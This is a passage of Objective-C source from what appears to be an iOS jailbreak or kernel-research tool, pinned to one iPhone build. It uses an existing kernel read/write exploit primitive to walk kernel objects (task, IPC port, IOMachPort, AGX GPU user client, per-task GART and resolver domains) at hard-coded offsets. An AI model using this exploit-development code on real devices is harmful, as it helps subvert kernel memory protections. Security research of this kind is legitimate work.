    BOOL e5DeviceReleaseGate, BOOL e5ConnectionReleaseGate,
    BOOL e5RawQueueReleaseGate, BOOL e5RawQueueBindReleaseGate,
    BOOL agxBootstrapRootGate, BOOL agxRTBuddyAliasGate,
    void (^completion)(NSDictionary<NSString *, id> *report))
{
    BOOL e5Gate = e5OwnerReleaseGate || e5DeviceReleaseGate ||
        e5ConnectionReleaseGate || e5RawQueueReleaseGate ||
        e5RawQueueBindReleaseGate;
    BOOL externalHelperGate = e2RetirementGate || e4InflightGate || e5Gate;
    BOOL strictRoute1Gate = externalHelperGate || agxBootstrapRootGate ||
        agxRTBuddyAliasGate;
    NSMutableDictionary<NSString *, id> *report = [@{
        @"schema": agxRTBuddyAliasGate
            ? @"com.zeroxjf.cyanide.uat-agx-rtbuddy-alias"
            : (agxBootstrapRootGate
            ? @"com.zeroxjf.cyanide.uat-agx-bootstrap-root"
            : (e5RawQueueBindReleaseGate
            ? @"com.zeroxjf.cyanide.uat-e5-raw-queue-bind-release"
            : (e5RawQueueReleaseGate
            ? @"com.zeroxjf.cyanide.uat-e5-raw-queue-release"
            : (e5ConnectionReleaseGate
            ? @"com.zeroxjf.cyanide.uat-e5-connection-release"
            : (e5DeviceReleaseGate
            ? @"com.zeroxjf.cyanide.uat-e5-device-release"
            : (e5OwnerReleaseGate
            ? @"com.zeroxjf.cyanide.uat-e5-owner-release"
            : (e4InflightGate
            ? @"com.zeroxjf.cyanide.uat-e4-inflight"
            : (e2RetirementGate
                ? @"com.zeroxjf.cyanide.uat-e2-retire"
                : @"com.zeroxjf.cyanide.uat-e1-observe")))))))),
        @"schemaVersion": @11,
        @"state": @"starting",
        @"pinnedImage": @"iPhone17,2 23A341",
        @"mode": @"read-only-kernel-memory-after-shared-krw-lifecycle",
        @"namedAction": agxRTBuddyAliasGate
            ? @"read-only-validate-accelerator-firmware-channel-RTBuddy-"
               "coredump-map-and-paired-OSArrays-then-explicitly-risk-one-"
               "bounded-stripped-segment-backing-read-select-one-exact-"
               "paired-IOMemoryMap-and-read-one-command20-output-word"
            : (agxBootstrapRootGate
            ? @"read-only-validate-accelerator-bootstrap-GART-domain3-"
               "context0-and-associate-its-two-symbol-retained-TTBAT-roots-"
               "without-reading-either-root-page"
            : (e5RawQueueBindReleaseGate
            ? @"host-launch-helper-open-exact-AGXAcceleratorG17P-type1-"
               "connection-create-one-raw-IO-command-queue-through-selector42-"
               "create-one-notification-queue-through-selector14-register-"
               "its-port-and-bind-through-selector44-prove-both-required-"
               "queue-fields-through-selector45-count-zero-oracle-hold-for-"
               "exact-TTBAT-open-snapshot-destroy-same-queue-through-"
               "selector43-while-notification-queue-connection-process-socket-"
               "and-App-Group-map-remain-live-poll-only-exact-16-byte-entry-"
               "then-release-notification-and-close-connection-as-excluded-cleanup"
            : (e5RawQueueReleaseGate
            ? @"host-launch-helper-open-exact-AGXAcceleratorG17P-type1-"
               "connection-create-one-raw-IO-command-queue-through-artifact-"
               "pinned-selector42-hold-for-exact-TTBAT-open-snapshot-destroy-"
               "same-queue-through-selector43-while-helper-connection-socket-"
               "and-App-Group-map-remain-live-poll-only-exact-16-byte-entry-"
               "then-close-connection-as-excluded-cleanup"
            : (e5ConnectionReleaseGate
            ? @"host-launch-helper-load-artifact-pinned-IOGPUMetalDevice-"
               "construct-through-normal-initWithAcceleratorPort-validate-"
               "deviceRef-exact-context-open-release-Objective-C-connection-"
               "owner-through-normal-dealloc-while-helper-process-socket-"
               "App-Group-map-and-system-device-remain-live-poll-only-exact-"
               "16-byte-TTBAT-entry-then-cleanup"
            : (e5DeviceReleaseGate
            ? @"host-launch-helper-load-exact-AGXG17P-class-create-private-"
               "device-through-artifact-pinned-initWithAcceleratorPort-"
               "complete-GPU-control-schedule-long-GPU-work-wait-until-"
               "scheduled-authenticate-nonzero-workload-rounds-exact-context-"
               "open-wait-for-work-completion-release-all-Metal-"
               "owners-including-private-device-and-its-deviceRef-connection-"
               "while-helper-process-socket-App-Group-map-and-system-device-"
               "remain-live-poll-only-exact-16-byte-TTBAT-entry-then-cleanup"
            : (e5OwnerReleaseGate
            ? @"host-launch-separately-signed-helper-completed-GPU-control-"
               "marker-schedule-long-GPU-work-and-wait-until-scheduled-"
               "authenticate-nonzero-workload-rounds-exact-context-open-"
               "wait-for-that-work-to-complete-then-drain-all-helper-owned-Metal-"
               "strong-references-in-nested-autoreleasepool-authenticate-"
               "weak-release-mask-while-helper-process-socket-App-Group-"
               "mapping-remain-live-poll-only-exact-16-byte-TTBAT-entry-"
               "then-authorize-cleanup-exit-and-full-snapshot"
            : (e4InflightGate
            ? @"observer-owned-App-Group-MAP_SHARED-file-Metal-no-copy-"
               "buffer-completed-control-marker-"
               "reset-exact-context-open-stage-finite-terminal-only-GPU-"
               "marker-commit-wait-until-scheduled-helper-exit-poll-exact-"
               "16-byte-TTBAT-entry-and-canary-final-full-snapshot-exit-EOF-ESRCH"
            : (e2RetirementGate
            ? @"snapshot-ttbat-host-launch-separately-signed-metal-helper-"
               "authenticate-loopback-submit-verify-hold-snapshot-release-"
               "authenticated-exit-peer-eof-wait-pid-ESRCH-observe-exact-"
               "resolve-one-public-gpu-address-through-validated-live-root-"
               "directory-table-leaf-path-and-observe-lower-frame-free-mask-"
               "retired-root-free-mask-bits-snapshot-retirement-then-"
               "fault-bounded-256-page-chunks-poll-exact-root-mask-bits-"
               "translate-only-first-clear-chunk-plus-512-page-magazine-"
               "tail-and-compare-frames-with-retired-roots"
            : @"snapshot-contexts-prepare-resolve-metal-device-connection-task-"
               "gart-snapshot-contexts-submit-verify-reresolve-metal-task-gart-"
               "snapshot-contexts-release-snapshot-base-contexts-one-Metal-"
               "blit-to-probe-owned-buffer")))))))),
        @"namedActionStatus": @"not-started",
        @"kernelReadUsed": @NO,
        @"kernelWriteUsed": @NO,
        @"kernelWriteCount": @0,
        @"getPTEInvoked": @NO,
        @"queueProbeInvoked": @NO,
        @"pointerScanUsed": @NO,
        @"krwPreparationOwner": @"settings_ensure_existing_krw_for_probe",
        @"krwPolicy": @"shared-tweak-lifecycle-existing-only",
        @"krwAdmission":
            @"shared-reuse-or-recovery-only-then-pinned-checked-read",
        @"probePrimitiveAPI": @"kexploit_krw_read_checked",
        @"probeOwnsKRWLifecycle": @NO,
        @"disposableActionProcess": @(externalHelperGate),
        @"externalHelperBundleID": externalHelperGate
            ? ((e4InflightGate || e5Gate)
                ? CNDUatE4HelperBundleIdentifier
                : @"com.zeroxjf.cyanide.e2metal")
            : @"not-applicable",
        @"hostExitWitnessRequired": @(externalHelperGate),
        @"allocatorReuseAttempted": @NO,
        @"checkedReadIdleStateContract":
            @"restore-control-checksum-and-complete-rw-filter-then-verify",
        @"pid": @(getpid()),
        @"progress": [NSMutableArray array],
        @"predicates": [NSMutableArray array],
    } mutableCopy];
    if (e2RetirementGate) report[@"schemaVersion"] = @7;
    if (e4InflightGate) report[@"schemaVersion"] = @1;
    if (e5OwnerReleaseGate) report[@"schemaVersion"] = @1;
    if (e5DeviceReleaseGate) report[@"schemaVersion"] = @1;
    if (e5ConnectionReleaseGate) report[@"schemaVersion"] = @1;
    if (e5RawQueueReleaseGate) report[@"schemaVersion"] = @1;
    if (e5RawQueueBindReleaseGate) report[@"schemaVersion"] = @1;
    if (agxBootstrapRootGate) report[@"schemaVersion"] = @1;
    if (agxRTBuddyAliasGate) report[@"schemaVersion"] = @1;
    CNDUatE1Progress(report, @"preflight", @"identity", 0);

    NSString *product = CNDUatE1SysctlString("hw.machine");
    NSString *build = CNDUatE1SysctlString("kern.osversion");
    report[@"productType"] = product;
    report[@"productBuildVersion"] = build;
    if (![product isEqualToString:@"iPhone17,2"] ||
        ![build isEqualToString:@"23A341"]) {
        CNDUatE1Finish(report, @"refused-unsupported-device", completion);
        return;
    }

    CNDUatE1API api;
    NSString *apiReason = nil;
    if (!CNDUatE1Resolve(&api, &apiReason)) {
        CNDUatE1Finish(report, apiReason ?: @"refused-krw-api-missing",
                       completion);
        return;
    }
    log_user("[%s] shared tweak KRW lifecycle completed; validating "
             "the pinned checked-read witness\n",
             (agxBootstrapRootGate || agxRTBuddyAliasGate) ? "AGX_SPTM" :
                (e4InflightGate ? "UAT_E4" :
                (e2RetirementGate ? "UAT_E2" : "UAT_E1")));
    report[@"ipcPortKobjectOffset"] =
        [NSString stringWithFormat:@"0x%x", *api.ipcPortKobjectOffset];
    if (*api.ipcPortKobjectOffset != CNDUatE1IPKObjectOffset) {
        CNDUatE1Finish(report, @"refused-ip-kobject-offset-mismatch",
                       completion);
        return;
    }
    uint64_t kernelBase = *api.kernelBase;
    uint64_t slide = *api.kernelSlide;
    report[@"kernelBase"] = CNDUatE1Hex(kernelBase);
    report[@"kernelSlide"] = CNDUatE1Hex(slide);
    report[@"t1sz"] = @(*api.t1sz);
    report[@"pointerBits"] = @(api.pointerBits);
    report[@"pointerMask"] = CNDUatE1Hex(api.pointerMask);
    if (kernelBase != CNDUatE1UnslidTextBase + slide ||
        (slide & (CNDUatE1PageSize - 1)) != 0) {
        CNDUatE1Finish(report, @"refused-kernel-base-slide-mismatch",
                       completion);
        return;
    }

    report[@"kernelReadUsed"] = @YES;
    CNDUatE1Progress(report, @"preflight", @"image-witness",
                     CNDUatE1UnslidIOUATInit + slide);
    uint32_t witness = 0;
    if (!CNDUatE1Read32(&api, CNDUatE1UnslidIOUATInit + slide, &witness)) {
        report[@"existingKrwCheckedRead"] = @NO;
        CNDUatE1Finish(report, @"refused-existing-krw-checked-read-failed",
                       completion);
        return;
    }
    report[@"existingKrwCheckedRead"] = @YES;
    report[@"imageWitness"] = [NSString stringWithFormat:@"0x%08x", witness];
    if (witness != CNDUatE1Pacibsp) {
        CNDUatE1Finish(report, @"refused-image-witness-mismatch", completion);
        return;
    }

    CNDUatE1Progress(report, @"preflight", @"read-uat-route-flag",
                     CNDUatE1UATRouteFlag + slide);
    uint8_t routeFlag = 0;
    if (!CNDUatE1Read8(&api, CNDUatE1UATRouteFlag + slide, &routeFlag)) {
        CNDUatE1Finish(report, @"refused-route-flag-read-failed",
                       completion);
        return;
    }
    report[@"uatRouteFlag"] = @(routeFlag);
    report[@"uatRouteFlagSource"] = @"AGXG17P __DATA,__bss; sole writer "
        "0x8af45cc from constructor constant at 0x8b05b44";
    CNDUatE1Persist(report);

    if (routeFlag != 0 && routeFlag != 1) {
        report[@"mainChainResult"] = @"unexpected-uat-route-flag";
        if (strictRoute1Gate) {
            report[@"fallbackResult"] = @"not-applicable-to-strict-route1";
            CNDUatE1Finish(report, @"fail-clean", completion);
            return;
        }
        NSString *f1Reason = nil;
        bool f1 = CNDUatE1RunFallback(report, &api, slide, &f1Reason);
        report[@"fallbackResult"] = f1 ? @"validated-f1-iouat" :
            (f1Reason ?: @"f1-failed");
        report[@"evidenceLevel"] = @"physical-observed";
        CNDUatE1Finish(report, f1 ? @"pass-partial-f1" : @"fail-clean",
                       completion);
        return;
    }
    if (strictRoute1Gate && routeFlag != 1) {
        report[@"mainChainResult"] = agxBootstrapRootGate
            ? @"agx-bootstrap-root-requires-live-sptm-ttbat-route"
            : @"e2-requires-live-sptm-ttbat-route";
        report[@"fallbackResult"] = @"not-applicable-to-strict-route1";
        CNDUatE1Finish(report, @"fail-clean", completion);
        return;
    }

    uint64_t gVirtBase = 0, gPhysSize = 0;
    if (routeFlag == 0) {
        CNDUatE1Progress(report, @"preflight", @"read-gVirtBase",
                         CNDUatE1GVirtBase + slide);
        if (!CNDUatE1Read64(&api, CNDUatE1GVirtBase + slide, &gVirtBase)) {
            CNDUatE1Finish(report, @"refused-gVirtBase-read-failed",
                           completion);
            return;
        }
        CNDUatE1Progress(report, @"preflight", @"read-gPhysSize",
                         CNDUatE1GPhysSize + slide);
        if (!CNDUatE1Read64(&api, CNDUatE1GPhysSize + slide, &gPhysSize)) {
            CNDUatE1Finish(report, @"refused-gPhysSize-read-failed",
                           completion);
            return;
        }
        report[@"gVirtBase"] = CNDUatE1Hex(gVirtBase);
        report[@"gPhysSize"] = CNDUatE1Hex(gPhysSize);
    }

    io_service_t service = IOServiceGetMatchingService(
        kIOMainPortDefault, IOServiceMatching("AGXAcceleratorG17P"));
    io_connect_t observer = IO_OBJECT_NULL;
    kern_return_t observerOpen = service != IO_OBJECT_NULL
        ? IOServiceOpen(service, mach_task_self(), 1, &observer)
        : kIOReturnNotFound;
    if (service != IO_OBJECT_NULL) IOObjectRelease(service);
    report[@"observerOpenKR"] = CNDUatE1Hex((uint32_t)observerOpen);
    if (observerOpen != KERN_SUCCESS || observer == IO_OBJECT_NULL) {
        report[@"mainChainResult"] = @"hop0-observer-open-failed";
        if (strictRoute1Gate) {
            report[@"fallbackResult"] = @"not-applicable-to-strict-route1";
            CNDUatE1Finish(report, @"fail-clean", completion);
            return;
        }
        NSString *f1Reason = nil;
        bool f1 = CNDUatE1RunFallback(report, &api, slide, &f1Reason);
        report[@"fallbackResult"] = f1 ? @"validated-f1-iouat" :
            (f1Reason ?: @"f1-failed");
        CNDUatE1Finish(report, f1 ? @"pass-partial-f1" : @"fail-clean",
                       completion);
        return;
    }

    bool mainPassed = false;
    bool mainTableReached = false;
    NSString *mainReason = nil;
    CNDUatE1Path paths[2];
    memset(paths, 0, sizeof(paths));
    NSUInteger pathCount = 0;
    const uint64_t gartOffsets[2] = {
        CNDUatE1AcceleratorGart0, CNDUatE1AcceleratorGart1
    };
    NSMutableArray *gartReports = nil;
    NSMutableArray *beforeReports = nil;
    NSMutableArray *afterReports = nil;
    NSMutableArray *allChanges = nil;
    NSUInteger validatedRoute1GartCount = 0;
    CNDUatE1ValidatedGart route1Garts[6];
    memset(route1Garts, 0, sizeof(route1Garts));
    NSMutableDictionary *hop0Unwrapped = nil;
    io_service_t actionService = IO_OBJECT_NULL;
    io_connect_t actionConnection = IO_OBJECT_NULL;

    CNDUatE1Progress(report, @"hop0", @"resolve-self-task-from-krw-anchor", 0);
    uint64_t selfTask = api.taskSelf();
    uint64_t canonicalSelfTask = CNDUatE1CanonicalPointer(&api, selfTask);
    bool selfTaskNonzero = selfTask != 0;
    bool selfTaskCanonical = canonicalSelfTask == selfTask;
    bool selfTaskAligned8 = (selfTask & 0x7) == 0;
    bool selfTaskAligned16 = (selfTask & 0xf) == 0;
    bool selfTaskPassed = selfTaskNonzero && selfTaskCanonical &&
        selfTaskAligned8;
    report[@"hop0SelfTaskPredicate"] = @{
        @"source": @"existing KRW rwSocketPcb -> socket -> background "
                    "thread -> thread_ro -> task",
        @"raw": CNDUatE1Hex(selfTask),
        @"canonical": CNDUatE1Hex(canonicalSelfTask),
        @"nonzero": @(selfTaskNonzero),
        @"canonicalMatches": @(selfTaskCanonical),
        @"aligned8": @(selfTaskAligned8),
        @"aligned16DiagnosticOnly": @(selfTaskAligned16),
        @"requiredAlignment": @8,
        @"passed": @(selfTaskPassed),
        @"physicalAlignmentWitnesses": @[
            @"0xffffffdd38544a68", @"0xffffffdd372b3408"
        ],
    };
    CNDUatE1Persist(report);
    log_user("[UAT_E1] hop=hop0 self-task raw=0x%016llx "
             "canonical=0x%016llx aligned8=%s aligned16=%s passed=%s\n",
             (unsigned long long)selfTask,
             (unsigned long long)canonicalSelfTask,
             selfTaskAligned8 ? "yes" : "no",
             selfTaskAligned16 ? "yes" : "no",
             selfTaskPassed ? "yes" : "no");
    if (!selfTaskPassed) {
        mainReason = !selfTaskNonzero ? @"hop0-self-task-zero" :
            (!selfTaskCanonical ? @"hop0-self-task-noncanonical" :
                                  @"hop0-self-task-alignment-failed");
        goto main_done;
    }

    CNDUatE1Progress(report, @"hop0", @"resolve-observer-ipc-port", 0);
    uint64_t portObjectBefore = api.portObject(selfTask, observer);
    uint64_t canonicalPortObject =
        CNDUatE1CanonicalPointer(&api, portObjectBefore);
    bool portObjectPassed = portObjectBefore != 0 &&
        canonicalPortObject == portObjectBefore &&
        (portObjectBefore & 0x7) == 0;
    report[@"hop0PortObjectPredicate"] = @{
        @"source": @"validated self task IPC table entry for observer port name",
        @"raw": CNDUatE1Hex(portObjectBefore),
        @"canonical": CNDUatE1Hex(canonicalPortObject),
        @"aligned8": @((portObjectBefore & 0x7) == 0),
        @"requiredAlignment": @8,
        @"passed": @(portObjectPassed),
    };
    CNDUatE1Persist(report);
    if (!portObjectPassed) {
        mainReason = @"hop0-ipc-port-resolution-failed";
        goto main_done;
    }

    uint64_t ipKobjectAddress = portObjectBefore + CNDUatE1IPKObjectOffset;
    CNDUatE1Progress(report, @"hop0", @"read-raw-ip-kobject-before",
                     ipKobjectAddress);
    uint64_t clientRawBefore = 0;
    if (!CNDUatE1Read64(&api, ipKobjectAddress, &clientRawBefore) ||
        clientRawBefore == 0) {
        mainReason = @"hop0-ip-kobject-read-failed";
        goto main_done;
    }

    CNDUatE1Progress(report, @"hop0", @"kernel-authenticate-io-connect", 0);
    io_service_t authenticatedService = IO_OBJECT_NULL;
    kern_return_t authKR = IOConnectGetService(observer,
                                                &authenticatedService);
    bool expectedNoService = authKR == CNDUatE1ExpectedNoService &&
        authenticatedService == IO_OBJECT_NULL;
    bool returnedService = authKR == KERN_SUCCESS &&
        authenticatedService != IO_OBJECT_NULL;
    if (authenticatedService != IO_OBJECT_NULL) {
        IOObjectRelease(authenticatedService);
        authenticatedService = IO_OBJECT_NULL;
    }
    if (!expectedNoService && !returnedService) {
        report[@"hop0"] = @{
            @"source": @"task_get_ipc_port_object + IOConnectGetService",
            @"selfTask": CNDUatE1Hex(selfTask),
            @"ipcPort": CNDUatE1Hex(portObjectBefore),
            @"rawIPKobjectBefore": CNDUatE1Hex(clientRawBefore),
            @"authKR": CNDUatE1Hex((uint32_t)authKR),
            @"expectedNoServiceKR":
                CNDUatE1Hex((uint32_t)CNDUatE1ExpectedNoService),
            @"kernelAuthenticated": @NO,
        };
        mainReason = @"hop0-kernel-auth-dispatch-failed";
        goto main_done;
    }

    uint64_t portObjectAfter = api.portObject(selfTask, observer);
    uint64_t clientRawAfter = 0;
    CNDUatE1Progress(report, @"hop0", @"read-raw-ip-kobject-after",
                     ipKobjectAddress);
    if (portObjectAfter != portObjectBefore ||
        !CNDUatE1Read64(&api, ipKobjectAddress, &clientRawAfter) ||
        clientRawAfter != clientRawBefore) {
        mainReason = @"hop0-ip-kobject-not-stable";
        goto main_done;
    }

    uint64_t wrapper = CNDUatE1CanonicalPointer(&api, clientRawAfter);
    report[@"hop0"] = @{
        @"source": @"task_get_ipc_port_object + IOConnectGetService",
        @"selfTaskSource": @"existing KRW socket/thread/task anchor",
        @"selfTask": CNDUatE1Hex(selfTask),
        @"ipcPort": CNDUatE1Hex(portObjectBefore),
        @"ipKobjectOffset": @"0x50",
        @"rawIPKobjectBefore": CNDUatE1Hex(clientRawBefore),
        @"rawIPKobjectAfter": CNDUatE1Hex(clientRawAfter),
        @"wrapper": CNDUatE1Hex(wrapper),
        @"authKR": CNDUatE1Hex((uint32_t)authKR),
        @"expectedNoServiceKR":
            CNDUatE1Hex((uint32_t)CNDUatE1ExpectedNoService),
        @"kernelAuthSite": @"converter 0x836d2d0..0x836d3b4; "
                            "handler 0x89b0908..0x89b09c8",
        @"stableAcrossAuthCall": @YES,
        @"kernelAuthenticated": @YES,
        @"el0PACReauthenticationAttempted": @NO,
    };
    CNDUatE1Persist(report);
    log_user("[UAT_E1] hop=hop0 kernel-auth kr=0x%08x "
             "ipc_port=0x%016llx wrapper=0x%016llx stable=yes\n",
             (unsigned)authKR, (unsigned long long)portObjectBefore,
             (unsigned long long)wrapper);

    // R19 typed ip_kobject as IOMachPort.  The exact 23A341 constructor
    // installs this vtable at 0x89a0d20; the connection-port factory stores
    // its underlying OSObject at wrapper+0x20 at 0x89a26f4.  The converter
    // authenticates that field at 0x836d330 before retaining the client.
    bool wrapperAligned8 = (wrapper & 0x7) == 0;
    bool wrapperShapePassed = wrapper != 0 && wrapperAligned8;
    report[@"hop0WrapperShapePredicate"] = @{
        @"canonical": CNDUatE1Hex(wrapper),
        @"nonzero": @(wrapper != 0),
        @"aligned8": @(wrapperAligned8),
        @"requiredAlignment": @8,
        @"passed": @(wrapperShapePassed),
    };
    CNDUatE1Persist(report);
    if (!wrapperShapePassed) {
        mainReason = @"hop0-iomachport-shape-failed";
        goto main_done;
    }
    if (!CNDUatE1ValidateLifecycleVptr(
            report, &api, @"hop0.iomachport", wrapper,
            CNDUatE1IOMachPortVtable, slide,
            @"IOMachPort registration 0x89a7440..0x89a74bc; constructor "
             "vptr install 0x89a0d08..0x89a0d20; converter auth "
             "0x836d2e8..0x836d2f4", NULL)) {
        mainReason = @"hop0-iomachport-vptr-failed";
        goto main_done;
    }

    CNDUatE1Progress(report, @"hop0", @"read-iomachport-object",
                     wrapper + CNDUatE1IOMachPortObject);
    uint64_t unwrappedRaw = 0;
    if (!CNDUatE1Read64(&api, wrapper + CNDUatE1IOMachPortObject,
                        &unwrappedRaw)) {
        mainReason = @"hop0-iomachport-object-read-failed";
        goto main_done;
    }
    uint64_t client = CNDUatE1CanonicalPointer(&api, unwrappedRaw);
    hop0Unwrapped = [report[@"hop0"] mutableCopy];
    hop0Unwrapped[@"unwrappedObject"] = CNDUatE1PointerReport(
        &api, unwrappedRaw);
    hop0Unwrapped[@"client"] = CNDUatE1Hex(client);
    hop0Unwrapped[@"wrapperObjectOffset"] = @"0x20";
    report[@"hop0"] = hop0Unwrapped;
    CNDUatE1Persist(report);

    // The kernel converter authenticated and retained this exact field's
    // object during IOConnectGetService.  The next vptr gate binds it to
    // the artifact-pinned AGXDeviceUserClient class before +0xf8 is read.
    bool clientAligned8 = (client & 0x7) == 0;
    bool clientAligned16 = (client & 0xf) == 0;
    bool clientShapePassed = client != 0 && clientAligned8;
    report[@"hop0ClientShapePredicate"] = @{
        @"source": @"kernel-authenticated IOMachPort+0x20 object",
        @"canonical": CNDUatE1Hex(client),
        @"nonzero": @(client != 0),
        @"aligned8": @(clientAligned8),
        @"aligned16DiagnosticOnly": @(clientAligned16),
        @"requiredAlignment": @8,
        @"passed": @(clientShapePassed),
    };
    CNDUatE1Persist(report);
    if (!clientShapePassed) {
        mainReason = @"hop0-unwrapped-client-shape-failed";
        goto main_done;
    }

    // C-12 pins the normal type-1 factory to AGXDeviceUserClient and its
    // exact instance vtable.  IOConnectGetService authenticated the
    // unwrapped object's vptr in kernel context.  Never touch +0xf8 unless
    // this exact class equality passes.
    if (!CNDUatE1ValidateLifecycleVptr(
            report, &api, @"hop1.client-class", client,
            CNDUatE1AGXDeviceUserClientVtable, slide,
            @"IOMachPort+0x20 converter auth 0x836d320..0x836d360; "
             "IOConnectGetService authenticated virtual +0x570; "
             "AGXDeviceUserClient registration 0x8ab04e0..0x8ab0518; "
             "metaclass alloc 0x8ab03b8; instance vtable fixups "
             "0x7cd4028/0x7cd42e8/0x7cd4348", NULL)) {
        mainReason = @"hop1-client-class-predicate-failed";
        goto main_done;
    }

    // The successful deviceUserClientStart path asks the validated provider
    // to create an AGXShared task through accelerator vtable +0x588, then
    // publishes the successfully initialized object at client+0x120.  The
    // common task base initializer invokes AGXShared vtable +0xe0 in kernel
    // context and publishes the initialized per-task AGXSecureGart at
    // task+0x58.  These are exact, bounded fields pinned by the C29 audit.
    if (routeFlag == 1) {
        CNDUatE1Progress(report, @"hop1.task", @"read-client-task",
                         client + CNDUatE1ClientTask);
        uint64_t taskRaw = 0;
        if (!CNDUatE1Read64(&api, client + CNDUatE1ClientTask, &taskRaw)) {
            mainReason = @"hop1-task-read-failed";
            goto main_done;
        }
        uint64_t task = CNDUatE1CanonicalPointer(&api, taskRaw);
        bool taskShapePassed = task != 0 && (task & 0x7) == 0;
        report[@"hop1Task"] = @{
            @"client": CNDUatE1Hex(client),
            @"fieldOffset": @"0x120",
            @"task": CNDUatE1PointerReport(&api, taskRaw),
            @"aligned8": @((task & 0x7) == 0),
            @"passedShape": @(taskShapePassed),
            @"staticWitness":
                @"deviceUserClientStart 0xa5026cc..0xa502708; provider "
                 "+0x588 task factory 0xa52c060; AGXShared allocator "
                 "0x8a78aa0 and vptr install 0x8b2fc5c..0x8b2fc74",
        };
        CNDUatE1Persist(report);
        if (!taskShapePassed || !CNDUatE1ValidateLifecycleVptr(
                report, &api, @"hop1.task-class", task,
                CNDUatE1AGXSharedVtable, slide,
                @"provider +0x588 factory 0xa52c060 authenticates and calls "
                 "new task vptr +0x88 at 0xa52c0b4..0xa52c0e4 before "
                 "client+0x120 publish 0xa502708; AGXShared exact vptr "
                 "install 0x8b2fc5c..0x8b2fc74", NULL)) {
            mainReason = @"hop1-task-class-predicate-failed";
            goto main_done;
        }

        CNDUatE1Progress(report, @"hop2.task-gart", @"read-task-gart",
                         task + CNDUatE1TaskGart);
        uint64_t taskGartRaw = 0;
        if (!CNDUatE1Read64(&api, task + CNDUatE1TaskGart,
                            &taskGartRaw)) {
            mainReason = @"hop2-task-gart-read-failed";
            goto main_done;
        }
        uint64_t taskGart = CNDUatE1CanonicalPointer(&api, taskGartRaw);
        bool taskGartShapePassed = taskGart != 0 &&
            (taskGart & 0x7) == 0;
        report[@"hop2TaskGart"] = @{
            @"task": CNDUatE1Hex(task),
            @"fieldOffset": @"0x58",
            @"gart": CNDUatE1PointerReport(&api, taskGartRaw),
            @"aligned8": @((taskGart & 0x7) == 0),
            @"passedShape": @(taskGartShapePassed),
            @"consumerWitness":
                @"IOGPUCommandQueue init 0xa52e294..0xa52e2ac copies "
                 "task+0x58 to queue+0x488; descriptor flow "
                 "0xa530bdc..0xa5254dc stores it at descriptor+0x58",
        };
        CNDUatE1Persist(report);
        if (!taskGartShapePassed || !CNDUatE1ValidateLifecycleVptr(
                report, &api, @"hop2.task-gart-class", taskGart,
                CNDUatE1GartVtable, slide,
                @"IOGPUTask base init authenticates AGXShared +0xe0 and "
                 "stores return at task+0x58 (0xa51cf4c..0xa51cf88); "
                 "AGXShared override authenticates GART +0xa8 init "
                 "0x8b2e4dc..0x8b2e508; G17P +0x858 factory selects "
                 "AGXSecureGart", NULL)) {
            mainReason = @"hop2-task-gart-predicate-failed";
            goto main_done;
        }
        route1Garts[validatedRoute1GartCount].address = taskGart;
        route1Garts[validatedRoute1GartCount].anchorIndex = 0;
        route1Garts[validatedRoute1GartCount].resolverSelector = 0;
        route1Garts[validatedRoute1GartCount].perTask = true;
        route1Garts[validatedRoute1GartCount].derivedDomain = false;
        validatedRoute1GartCount++;
        report[@"perTaskGartReached"] = @YES;
        report[@"perTaskGart"] = CNDUatE1Hex(taskGart);
        CNDUatE1Persist(report);
        log_user("[UAT_E1] per-task chain client=0x%016llx "
                 "task=0x%016llx gart=0x%016llx validated=yes\n",
                 (unsigned long long)client,
                 (unsigned long long)task,
                 (unsigned long long)taskGart);

        // AGXSecureGart +0x158 resolves descriptor+0x158 selectors through
        // exact fields on the validated task GART: 1 -> +0x338,
        // 3 -> +0x340, and 7 -> +0x348 (0x8af7118..0x8af715c).
        // The publisher 0x8b2db20..0x8b2dc6c creates each non-null object
        // through accelerator +0x5e8 -> 0x8a7bf58, which in turn uses the
        // same +0x858 AGXSecureGart factory and authenticated +0xa8 init.
        // Read only these three fixed fields; a null domain is recorded and
        // never dereferenced.  Every non-null child receives its own exact
        // vptr gate before it enters the phase snapshot set.
        const uint64_t resolverDomainOffsets[3] = {
            CNDUatE1GartResolverDomain1,
            CNDUatE1GartResolverDomain3,
            CNDUatE1GartResolverDomain7,
        };
        const NSUInteger resolverDomainSelectors[3] = {1, 3, 7};
        NSMutableArray<NSDictionary<NSString *, id> *> *resolverDomains =
            [NSMutableArray array];
        for (NSUInteger domainIndex = 0; domainIndex < 3; domainIndex++) {
            uint64_t fieldOffset = resolverDomainOffsets[domainIndex];
            NSUInteger selector = resolverDomainSelectors[domainIndex];
            NSString *hop = [NSString stringWithFormat:
                @"hop2.task-gart-domain%lu", (unsigned long)selector];
            CNDUatE1Progress(report, hop, @"read-resolver-domain-gart",
                             taskGart + fieldOffset);
            uint64_t domainGartRaw = 0;
            if (!CNDUatE1Read64(&api, taskGart + fieldOffset,
                                &domainGartRaw)) {
                mainReason = [NSString stringWithFormat:
                    @"hop2-task-gart-domain%lu-read-failed",
                    (unsigned long)selector];
                goto main_done;
            }
            uint64_t domainGart =
                CNDUatE1CanonicalPointer(&api, domainGartRaw);
            NSMutableDictionary<NSString *, id> *domainReport = [@{
                @"selector": @(selector),
                @"fieldOffset": [NSString stringWithFormat:@"0x%llx",
                    (unsigned long long)fieldOffset],
                @"pointer": CNDUatE1PointerReport(&api, domainGartRaw),
                @"staticResolverWitness":
                    @"AGXSecureGart +0x150 target 0x8af7118; +0x158 "
                     "wrapper 0x8b12b04; domain publisher "
                     "0x8b2db20..0x8b2dc6c",
            } mutableCopy];
            [resolverDomains addObject:domainReport];
            report[@"perTaskGartResolverDomains"] = resolverDomains;
            CNDUatE1Persist(report);
            if (domainGart == 0) {
                domainReport[@"result"] = @"null-skipped";
                CNDUatE1Persist(report);
                log_user("[UAT_E1] per-task resolver selector=%lu "
                         "field=0x%llx result=null-skipped\n",
                         (unsigned long)selector,
                         (unsigned long long)fieldOffset);
                continue;
            }
            bool domainShapePassed = (domainGart & 0x7) == 0;
            domainReport[@"aligned8"] = @(domainShapePassed);
            if (!domainShapePassed || !CNDUatE1ValidateLifecycleVptr(
                    report, &api, hop, domainGart,
                    CNDUatE1GartVtable, slide,
                    @"validated parent AGXSecureGart exact resolver field; "
                     "accelerator +0x5e8 factory 0x8a7bf58 uses the same "
                     "+0x858 concrete factory and authenticated +0xa8 init; "
                     "parent retains domain child", NULL)) {
                domainReport[@"result"] = @"predicate-failed";
                CNDUatE1Persist(report);
                mainReason = [NSString stringWithFormat:
                    @"hop2-task-gart-domain%lu-predicate-failed",
                    (unsigned long)selector];
                goto main_done;
            }
            if (validatedRoute1GartCount >= 6) {
